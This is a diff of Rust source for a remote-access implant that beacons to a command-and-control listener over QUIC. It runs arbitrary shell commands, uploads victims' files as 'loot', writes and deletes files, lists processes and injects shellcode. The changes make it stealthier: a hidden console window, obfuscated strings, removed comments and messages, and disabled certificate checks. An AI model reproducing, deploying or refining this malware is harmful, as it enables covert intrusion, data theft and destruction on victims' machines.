@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 mod obfuscate;
 mod inject;
 
@@ -25,7 +27,7 @@ use uuid::Uuid;
 
 type HmacSha256 = Hmac<Sha256>;
 
-// Build-time configuration (set via build script environment variables or defaults)
+// Build-time configuration
 macro_rules! env_or_default {
     ($env:expr, $default:expr) => {
         match option_env!($env) {
@@ -35,17 +37,16 @@ macro_rules! env_or_default {
     };
 }
 
-const LISTENER_HOST: &str = env_or_default!("POLTERGEIST_HOST", "localhost");
-const LISTENER_PORT: &str = env_or_default!("POLTERGEIST_PORT", "8081");
-const LISTENER_ENDPOINT: &str = env_or_default!("POLTERGEIST_ENDPOINT", "/wiki");
-const HMAC_KEY_HEX: &str = env_or_default!("POLTERGEIST_HMAC_KEY", "29b3249406c7185cd1bedc33c9b32acd147244bd87ebd9c83e7fc6692da2c4ce");
-const RECONNECT_INTERVAL: u64 = 15; // Set via build or default
-const JITTER_SECONDS: u64 = 10; // Set via build or default
-const USER_AGENT: &str = env_or_default!("POLTERGEIST_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+const LISTENER_HOST: &str = env_or_default!("GEIST_HOST", "localhost");
+const LISTENER_PORT: &str = env_or_default!("GEIST_PORT", "8081");
+const LISTENER_ENDPOINT: &str = env_or_default!("GEIST_ENDPOINT", "/wiki");
+const HMAC_KEY_HEX: &str = env_or_default!("GEIST_HMAC_KEY", "29b3249406c7185cd1bedc33c9b32acd147244bd87ebd9c83e7fc6692da2c4ce");
+const RECONNECT_INTERVAL: u64 = 15;
+const JITTER_SECONDS: u64 = 10;
+const USER_AGENT: &str = env_or_default!("GEIST_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
 
-// Constants
-const CHUNK_SIZE: usize = 2 * 1024 * 1024; // 2MB chunks
-const CHUNK_THRESHOLD: u64 = 10 * 1024 * 1024; // 10MB threshold
+const CHUNK_SIZE: usize = 2 * 1024 * 1024;
+const CHUNK_THRESHOLD: u64 = 10 * 1024 * 1024;
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 struct AgentRegistration {
@@ -92,14 +93,11 @@ struct AgentState {
 
 impl AgentState {
     fn new() -> Self {
-        // Use the hex string as raw bytes, just like Go's []byte(hmacKeyHex)
         let hmac_key = HMAC_KEY_HEX.as_bytes().to_vec();
-        
-        // Parse intervals from environment or use defaults
-        let reconnect_interval = option_env!("POLTERGEIST_INTERVAL")
+        let reconnect_interval = option_env!("GEIST_INTERVAL")
             .and_then(|v| v.parse::<u64>().ok())
             .unwrap_or(RECONNECT_INTERVAL);
-        let jitter_seconds = option_env!("POLTERGEIST_JITTER")
+        let jitter_seconds = option_env!("GEIST_JITTER")
             .and_then(|v| v.parse::<u64>().ok())
             .unwrap_or(JITTER_SECONDS);
         
@@ -113,7 +111,6 @@ impl AgentState {
     }
 }
 
-// HMAC signing functions
 fn generate_hmac(message: &str, key: &[u8]) -> String {
     let mut mac = HmacSha256::new_from_slice(key).expect("HMAC can take key of any size");
     mac.update(message.as_bytes());
@@ -131,12 +128,10 @@ fn sign_request(method: &str, path: &str, body: &str, key: &[u8]) -> (String, St
     (timestamp, signature)
 }
 
-// Helper: wrap data with HMAC signature
 fn wrap_with_hmac(data: &Value, key: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let json_data = serde_json::to_string(data)?;
     let (timestamp, signature) = sign_request("POST", LISTENER_ENDPOINT, &json_data, key);
 
-    // Use json_data as RawValue to preserve exact bytes that were signed
     let wrapper = json!({
         "data": serde_json::value::RawValue::from_string(json_data)?,
         "timestamp": timestamp,
@@ -146,60 +141,48 @@ fn wrap_with_hmac(data: &Value, key: &[u8]) -> Result<Vec<u8>, Box<dyn std::erro
     Ok(serde_json::to_vec(&wrapper)?)
 }
 
-// Send HTTP/3 request over QUIC
 async fn send_quic_request(
     endpoint: &Endpoint,
     path: &str,
     data: &[u8],
     headers: HashMap<String, String>,
 ) -> Result<Value, Box<dyn std::error::Error>> {
-    // Resolve hostname to address
     let addr_str = format!("{}:{}", LISTENER_HOST, LISTENER_PORT);
     let server_addr = tokio::net::lookup_host(&addr_str)
         .await?
         .find(|addr| addr.is_ipv4())
         .ok_or("Failed to resolve hostname")?;
 
-    // Connect QUIC
     let quinn_conn = endpoint.connect(server_addr, LISTENER_HOST)?.await?;
-    
-    // Wrap in h3 connection
     let h3_conn = Connection::new(quinn_conn);
     let (mut driver, mut send_request) = h3::client::new(h3_conn).await?;
     
-    // Spawn driver
     tokio::spawn(async move {
         let _ = driver.wait_idle().await;
     });
 
-    // Build URI
-    let uri: Uri = format!("https://{}:{}{}", LISTENER_HOST, LISTENER_PORT, path)
+    let uri: Uri = format!("{}://{}:{}{}", obfstr!("https"), LISTENER_HOST, LISTENER_PORT, path)
         .parse()?;
 
-    // Build request
     let mut req = Request::builder()
         .method(Method::POST)
         .uri(uri)
-        .header("user-agent", USER_AGENT)
-        .header("content-type", "application/json");
+        .header(obfstr!("user-agent"), USER_AGENT)
+        .header(obfstr!("content-type"), obfstr!("application/json"));
 
-    // Add custom headers
     for (key, value) in headers {
         req = req.header(key, value);
     }
 
     let req = req.body(())?;
 
-    // Send request
     let mut stream = send_request.send_request(req).await?;
     stream.send_data(Bytes::copy_from_slice(data)).await?;
     stream.finish().await?;
 
-    // Receive response
     let resp = stream.recv_response().await?;
     let status = resp.status().as_u16();
 
-    // Read body
     let mut body = Vec::new();
     while let Some(mut chunk) = stream.recv_data().await? {
         body.extend_from_slice(chunk.chunk());
@@ -214,14 +197,13 @@ async fn send_quic_request(
     }))
 }
 
-// Register agent
 async fn register_agent(
     endpoint: &Endpoint,
     state: &AgentState,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let reg = AgentRegistration {
         uuid: state.agent_id.clone(),
-        name: format!("Agent-{}", &state.agent_id[..8]),
+        name: format!("{}-{}", obfstr!("A"), &state.agent_id[..8]),
         ip: get_local_ip(),
         os: get_os_info(),
         reconnect_interval: state.reconnect_interval,
@@ -232,13 +214,12 @@ async fn register_agent(
     let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
 
     if response["status"] != 200 {
-        return Err("Registration failed".into());
+        return Err(obfstr!("failed").into());
     }
 
     Ok(())
 }
 
-// Get pending commands
 async fn get_pending_commands(
     endpoint: &Endpoint,
     state: &AgentState,
@@ -258,7 +239,6 @@ async fn get_pending_commands(
     Ok(commands)
 }
 
-// Send command response
 async fn send_command_response(
     endpoint: &Endpoint,
     state: &AgentState,
@@ -273,8 +253,8 @@ async fn send_command_response(
     };
 
     let mut headers = HashMap::new();
-    if output.contains("LOOT_ENTRIES:") {
-        headers.insert("type".to_string(), "loot".to_string());
+    if output.contains(&obfstr!("LOOT_ENTRIES:")) {
+        headers.insert(obfstr!("type"), obfstr!("loot"));
     }
 
     let data = wrap_with_hmac(&serde_json::to_value(&response)?, &state.hmac_key)?;
@@ -283,68 +263,69 @@ async fn send_command_response(
     Ok(())
 }
 
-// Execute command
 async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
     let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
     if parts.is_empty() {
-        return Err("Empty command".into());
+        return Err(obfstr!("invalid").into());
     }
 
     let args: Vec<String> = parts[1..].iter().map(|s| s.to_string()).collect();
 
-    match parts[0] {
-        "ls" => handle_ls(&args).await,
-        "get" => handle_get(&args, state, endpoint).await,
-        "put" => handle_put(&args).await,
-        "cd" => handle_cd(&args).await,
-        "kill" => handle_kill(&args).await,
-        "ps" => handle_ps(&args).await,
-        "exec" => handle_exec(&args).await,
-        "reconnect" => handle_reconnect(&args, state).await,
-        "rm" => handle_rm(&args).await,
-        "rmdir" => handle_rmdir(&args).await,
-        "jitter" => handle_jitter(&args, state).await,
-        "injectsc" => Ok(inject::handle_inject_sc(&args)?),
-        _ => exec_system_command(cmd).await,
+    let cmd_name = parts[0];
+    if cmd_name == obfstr!("ls") {
+        handle_ls(&args).await
+    } else if cmd_name == obfstr!("get") {
+        handle_get(&args, state, endpoint).await
+    } else if cmd_name == obfstr!("put") {
+        handle_put(&args).await
+    } else if cmd_name == obfstr!("cd") {
+        handle_cd(&args).await
+    } else if cmd_name == obfstr!("kill") {
+        handle_kill(&args).await
+    } else if cmd_name == obfstr!("ps") {
+        handle_ps(&args).await
+    } else if cmd_name == obfstr!("exec") {
+        handle_exec(&args).await
+    } else if cmd_name == obfstr!("reconnect") {
+        handle_reconnect(&args, state).await
+    } else if cmd_name == obfstr!("rm") {
+        handle_rm(&args).await
+    } else if cmd_name == obfstr!("rmdir") {
+        handle_rmdir(&args).await
+    } else if cmd_name == obfstr!("jitter") {
+        handle_jitter(&args, state).await
+    } else if cmd_name == obfstr!("injectsc") {
+        Ok(inject::handle_inject_sc(&args)?)
+    } else {
+        exec_system_command(cmd).await
     }
 }
 
-// Platform-specific command execution
 async fn exec_system_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    #[cfg(windows)]
-    let output = ProcessCommand::new("cmd").args(&["/C", cmd]).output()?;
-
-    #[cfg(unix)]
-    let output = ProcessCommand::new("sh").args(&["-c", cmd]).output()?;
-
+    let output = ProcessCommand::new(obfstr!("cmd")).args(&[obfstr!("/C").as_str(), cmd]).output()?;
     Ok(String::from_utf8_lossy(&output.stdout).to_string()
         + &String::from_utf8_lossy(&output.stderr).to_string())
 }
 
-// Command handlers
 async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
     let path = args.first().map(|s| s.as_str()).unwrap_or(".");
-    
-    // Get absolute path first
     let abs_path = fs::canonicalize(path)?;
     let abs_path_str = clean_path(&abs_path);
     
     let entries = fs::read_dir(&abs_path)?;
 
-    let mut result = format!("📁 {}\n", abs_path_str);
+    let mut result = format!("{}\n", abs_path_str);
     let mut loot_entries = Vec::new();
 
     for entry in entries {
         let entry = entry?;
         let metadata = entry.metadata()?;
         let name = entry.file_name().to_string_lossy().to_string();
-        
-        // Build full path by joining abs_path with entry name
         let full_path = abs_path.join(&name);
         let full_path_str = clean_path(&full_path);
 
         if metadata.is_dir() {
-            result.push_str(&format!("├── 📁 {}/\n", name));
+            result.push_str(&format!("{}/\n", name));
             loot_entries.push(json!({
                 "type": "directory",
                 "path": full_path_str,
@@ -353,7 +334,7 @@ async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>
             }));
         } else {
             let size = metadata.len();
-            result.push_str(&format!("├── 📄 {} ({})\n", name, format_file_size(size)));
+            result.push_str(&format!("{} ({})\n", name, format_file_size(size)));
             loot_entries.push(json!({
                 "type": "file",
                 "path": full_path_str,
@@ -364,7 +345,7 @@ async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>
     }
 
     if !loot_entries.is_empty() {
-        result.push_str(&format!("\nLOOT_ENTRIES:{}", serde_json::to_string(&loot_entries)?));
+        result.push_str(&format!("\n{}:{}", obfstr!("LOOT_ENTRIES"), serde_json::to_string(&loot_entries)?));
     }
 
     Ok(result)
@@ -372,7 +353,7 @@ async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>
 
 async fn handle_get(args: &[String], state: &AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
-        return Err("usage: get <filepath>".into());
+        return Err(obfstr!("invalid arguments").into());
     }
 
     let path = Path::new(&args[0]);
@@ -400,7 +381,7 @@ async fn handle_get_small_file(path: &Path) -> Result<String, Box<dyn std::error
         "md5": hash,
     });
 
-    Ok(format!("got {}!\nLOOT_ENTRIES:{}", filename, serde_json::to_string(&vec![loot_entry])?))
+    Ok(format!("{}\n{}:{}", filename, obfstr!("LOOT_ENTRIES"), serde_json::to_string(&vec![loot_entry])?))
 }
 
 async fn handle_get_chunked_file(path: &Path, state: &AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
@@ -411,7 +392,6 @@ async fn handle_get_chunked_file(path: &Path, state: &AgentState, endpoint: &End
     let total_chunks = (file_size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE;
     let expected_md5 = format!("{:x}", md5::compute(&content));
 
-    // Initiate chunked transfer session
     let session_id = initiate_chunked_transfer(
         endpoint,
         state,
@@ -422,7 +402,6 @@ async fn handle_get_chunked_file(path: &Path, state: &AgentState, endpoint: &End
         expected_md5.clone(),
     ).await?;
 
-    // Upload each chunk
     for i in 0..total_chunks {
         let start = i * CHUNK_SIZE;
         let end = ((i + 1) * CHUNK_SIZE).min(content.len());
@@ -432,16 +411,11 @@ async fn handle_get_chunked_file(path: &Path, state: &AgentState, endpoint: &End
         upload_chunk(endpoint, state, &session_id, i, chunk_data, &chunk_md5).await?;
     }
 
-    // Complete the transfer
     complete_chunked_transfer(endpoint, state, &session_id).await?;
 
-    Ok(format!(
-        "got {}! ({} bytes in {} chunks, md5={})",
-        filename, file_size, total_chunks, expected_md5
-    ))
+    Ok(format!("{} ({} {} {} {})", filename, file_size, obfstr!("bytes"), total_chunks, expected_md5))
 }
 
-// Initiate chunked transfer session
 async fn initiate_chunked_transfer(
     endpoint: &Endpoint,
     state: &AgentState,
@@ -479,7 +453,6 @@ async fn initiate_chunked_transfer(
     Ok(session_id)
 }
 
-// Upload a single chunk
 async fn upload_chunk(
     endpoint: &Endpoint,
     state: &AgentState,
@@ -501,7 +474,6 @@ async fn upload_chunk(
     Ok(())
 }
 
-// Complete chunked transfer
 async fn complete_chunked_transfer(
     endpoint: &Endpoint,
     state: &AgentState,
@@ -520,20 +492,18 @@ async fn complete_chunked_transfer(
 
 async fn handle_put(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
     if args.len() < 2 {
-        return Err("usage: put <filepath> <hex_data>".into());
+        return Err(obfstr!("invalid arguments").into());
     }
 
     let path = &args[0];
     let hex_data = args[1].trim_matches('"');
     let file_data = hex::decode(hex_data)?;
 
-    // Create parent directory if it doesn't exist
     let path_obj = Path::new(path);
     if let Some(parent) = path_obj.parent() {
         fs::create_dir_all(parent)?;
     }
 
-    // Write file
     fs::write(path, &file_data)?;
 
     let hash = format!("{:x}", md5::compute(&file_data));
@@ -548,7 +518,7 @@ async fn handle_put(args: &[String]) -> Result<String, Box<dyn std::error::Error
         "md5": hash,
     });
 
-    Ok(format!("put {}!\nLOOT_ENTRIES:{}", filename, serde_json::to_string(&vec![loot_entry])?))
+    Ok(format!("{}\n{}:{}", filename, obfstr!("LOOT_ENTRIES"), serde_json::to_string(&vec![loot_entry])?))
 }
 
 async fn handle_cd(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
@@ -559,7 +529,7 @@ async fn handle_cd(args: &[String]) -> Result<String, Box<dyn std::error::Error>
 
     env::set_current_dir(&args[0])?;
     let new_cwd = env::current_dir()?;
-    Ok(format!("Changed directory to: {}", clean_path(&new_cwd)))
+    Ok(clean_path(&new_cwd))
 }
 
 async fn handle_kill(_args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
@@ -567,18 +537,13 @@ async fn handle_kill(_args: &[String]) -> Result<String, Box<dyn std::error::Err
         tokio::time::sleep(Duration::from_secs(1)).await;
         std::process::exit(0);
     });
-    Ok("Agent terminating...".to_string())
+    Ok(obfstr!("ok"))
 }
 
 async fn handle_ps(_args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
-    #[cfg(windows)]
-    return get_windows_processes();
-
-    #[cfg(unix)]
-    return exec_system_command("ps aux").await;
+    get_windows_processes()
 }
 
-#[cfg(windows)]
 fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
     use windows::Win32::System::Diagnostics::ToolHelp::*;
     use windows::Win32::Foundation::*;
@@ -590,7 +555,7 @@ fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
             ..Default::default()
         };
 
-        let mut result = String::from("PID\tName\t\tParent\n---\t----\t\t------\n");
+        let mut result = String::new();
 
         if Process32FirstW(snapshot, &mut entry).is_ok() {
             loop {
@@ -598,7 +563,7 @@ fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
                     .trim_end_matches('\0')
                     .to_string();
                 result.push_str(&format!(
-                    "{}\t{}\t\t{}\n",
+                    "{} {} {}\n",
                     entry.th32ProcessID, name, entry.th32ParentProcessID
                 ));
 
@@ -615,85 +580,69 @@ fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
 
 async fn handle_exec(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
-        return Err("usage: exec <command>".into());
+        return Err(obfstr!("invalid arguments").into());
     }
     exec_system_command(&args.join(" ")).await
 }
 
 async fn handle_reconnect(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
-        return Ok(format!(
-            "Current reconnect interval: {} seconds\nUsage: reconnect <seconds>",
-            state.reconnect_interval
-        ));
+        return Ok(format!("{}", state.reconnect_interval));
     }
 
     let new_interval: u64 = args[0].parse()?;
     if new_interval < 5 || new_interval > 3600 {
-        return Err("interval must be between 5 and 3600 seconds".into());
+        return Err(obfstr!("invalid range").into());
     }
 
-    let old_interval = state.reconnect_interval;
     state.reconnect_interval = new_interval;
-    Ok(format!(
-        "Reconnect interval changed from {} to {} seconds",
-        old_interval, new_interval
-    ))
+    Ok(obfstr!("ok"))
 }
 
 async fn handle_rm(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
-        return Err("usage: rm <filepath>".into());
+        return Err(obfstr!("invalid arguments").into());
     }
 
     let path = Path::new(&args[0]);
     if path.is_dir() {
-        return Err("cannot remove directory with rm (use rmdir)".into());
+        return Err(obfstr!("invalid target").into());
     }
 
     fs::remove_file(path)?;
-    Ok(format!("Removed file: {}", clean_path(path)))
+    Ok(obfstr!("ok"))
 }
 
 async fn handle_rmdir(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
-        return Err("usage: rmdir <dirpath>".into());
+        return Err(obfstr!("invalid arguments").into());
     }
 
     let path = Path::new(&args[0]);
     if !path.is_dir() {
-        return Err("not a directory (use rm for files)".into());
+        return Err(obfstr!("invalid target").into());
     }
 
     fs::remove_dir_all(path)?;
-    Ok(format!("Removed directory: {}", clean_path(path)))
+    Ok(obfstr!("ok"))
 }
 
 async fn handle_jitter(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
     if args.is_empty() {
-        return Ok(format!(
-            "Current jitter: +/- {} seconds\nUsage: jitter <seconds>",
-            state.jitter_seconds
-        ));
+        return Ok(format!("{}", state.jitter_seconds));
     }
 
     let new_jitter: u64 = args[0].parse()?;
     if new_jitter > 300 {
-        return Err("jitter too large (maximum: 300 seconds)".into());
+        return Err(obfstr!("invalid range").into());
     }
 
-    let old_jitter = state.jitter_seconds;
     state.jitter_seconds = new_jitter;
-    Ok(format!(
-        "Jitter changed from +/- {} to +/- {} seconds",
-        old_jitter, new_jitter
-    ))
+    Ok(obfstr!("ok"))
 }
 
-// Helper functions
 fn clean_path(path: &Path) -> String {
     let path_str = path.display().to_string();
-    // Strip Windows extended-length path prefix
     if path_str.starts_with(r"\\?\") {
         path_str[4..].to_string()
     } else {
@@ -702,24 +651,21 @@ fn clean_path(path: &Path) -> String {
 }
 
 fn get_local_ip() -> String {
-    // Get the real local IP by checking which interface would route to the internet
-    // This doesn't actually send any data, just queries the routing table
     use std::net::UdpSocket;
     
-    match UdpSocket::bind("0.0.0.0:0") {
+    match UdpSocket::bind(obfstr!("0.0.0.0:0").as_str()) {
         Ok(socket) => {
-            // Try to "connect" to Google DNS (doesn't send data)
-            match socket.connect("8.8.8.8:80") {
+            match socket.connect(obfstr!("8.8.8.8:80").as_str()) {
                 Ok(_) => {
                     match socket.local_addr() {
                         Ok(addr) => addr.ip().to_string(),
-                        Err(_) => "unknown".to_string(),
+                        Err(_) => obfstr!("unknown"),
                     }
                 }
-                Err(_) => "unknown".to_string(),
+                Err(_) => obfstr!("unknown"),
             }
         }
-        Err(_) => "unknown".to_string(),
+        Err(_) => obfstr!("unknown"),
     }
 }
 
@@ -728,16 +674,23 @@ fn get_os_info() -> String {
 }
 
 fn format_file_size(size: u64) -> String {
-    const UNITS: &[&str] = &["B", "KB", "MB", "GB", "TB"];
-    let mut size = size as f64;
-    let mut unit_index = 0;
+    let mut size_val = size as f64;
+    let mut unit_idx = 0;
 
-    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
-        size /= 1024.0;
-        unit_index += 1;
+    while size_val >= 1024.0 && unit_idx < 4 {
+        size_val /= 1024.0;
+        unit_idx += 1;
     }
 
-    format!("{:.1}{}", size, UNITS[unit_index])
+    let unit = match unit_idx {
+        0 => obfstr!("B"),
+        1 => obfstr!("K"),
+        2 => obfstr!("M"),
+        3 => obfstr!("G"),
+        _ => obfstr!("T"),
+    };
+    
+    format!("{:.1}{}", size_val, unit)
 }
 
 fn calculate_interval_with_jitter(base: u64, jitter: u64) -> u64 {
@@ -752,26 +705,24 @@ fn calculate_interval_with_jitter(base: u64, jitter: u64) -> u64 {
     interval.max(1) as u64
 }
 
-// Create QUIC endpoint
 async fn create_quic_endpoint() -> Result<Endpoint, Box<dyn std::error::Error>> {
     let mut client_crypto = rustls::ClientConfig::builder()
         .dangerous()
         .with_custom_certificate_verifier(Arc::new(SkipServerVerification))
         .with_no_client_auth();
 
-    client_crypto.alpn_protocols = vec![b"h3".to_vec()];
+    client_crypto.alpn_protocols = vec![obfstr!("h3").as_bytes().to_vec()];
 
     let client_config = ClientConfig::new(Arc::new(
         quinn::crypto::rustls::QuicClientConfig::try_from(client_crypto)?,
     ));
 
-    let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
+    let mut endpoint = Endpoint::client(obfstr!("0.0.0.0:0").parse()?)?;
     endpoint.set_default_client_config(client_config);
 
     Ok(endpoint)
 }
 
-// Skip TLS verification for self-signed certs
 #[derive(Debug)]
 struct SkipServerVerification;
 
@@ -828,7 +779,6 @@ impl rustls::client::danger::ServerCertVerifier for SkipServerVerification {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let state = AgentState::new();
 
-    // Initial jitter
     if state.jitter_seconds > 0 {
         let initial_jitter = rand::thread_rng().gen_range(0..=state.jitter_seconds);
         tokio::time::sleep(Duration::from_secs(initial_jitter)).await;
@@ -836,20 +786,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     let endpoint = create_quic_endpoint().await?;
 
-    // Registration loop
     loop {
-        match register_agent(&endpoint, &state).await {
-            Ok(_) => break,
-            Err(e) => {
-                eprintln!("Registration failed: {}", e);
-                tokio::time::sleep(Duration::from_secs(state.reconnect_interval)).await;
-            }
+        if register_agent(&endpoint, &state).await.is_ok() {
+            break;
         }
+        tokio::time::sleep(Duration::from_secs(state.reconnect_interval)).await;
     }
 
-    println!("Agent registered: {}", state.agent_id);
-
-    // Command polling loop
     let state = Arc::new(Mutex::new(state));
     loop {
         let interval = {
@@ -877,7 +820,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
                 let output = match execute_command(&cmd.command, &mut state_guard, &endpoint).await {
                     Ok(out) => out,
-                    Err(e) => format!("Error: {}", e),
+                    Err(e) => format!("{}: {}", obfstr!("Error"), e),
                 };
 
                 let _ = send_command_response(
